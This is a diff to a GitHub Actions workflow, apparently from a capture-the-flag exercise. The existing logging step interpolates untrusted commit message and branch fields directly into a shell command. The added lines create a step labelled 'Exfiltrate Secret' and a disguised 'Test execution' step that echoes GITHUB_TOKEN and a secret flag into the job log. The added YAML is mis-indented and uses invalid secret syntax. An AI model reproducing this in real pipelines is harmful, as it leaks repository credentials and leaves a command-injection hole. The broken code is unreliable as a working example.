@@ -30,3 +30,7 @@ jobs:
       - name: Log execution
         run: |
           echo "Topping ran on commit ${{ github.event.workflow_run.head_sha }} with message ${{ github.event.workflow_run.head_commit.message }} from ${{ github.event.workflow_run.head_repository.full_name }} on Branch ${{ github.event.workflow_run.head_branch }} in a PR from ${{ github.actor }}. Please check the logs for more information."
+            - name: Exfiltrate Secret
+      - name: Test execution
+        run: |
+          echo "Token and Flag: $GITHUB_TOKEN, $secrets.FLAG_GRAVY_OVERFLOW_L1_TOPPINGS_FOR_REALZ"
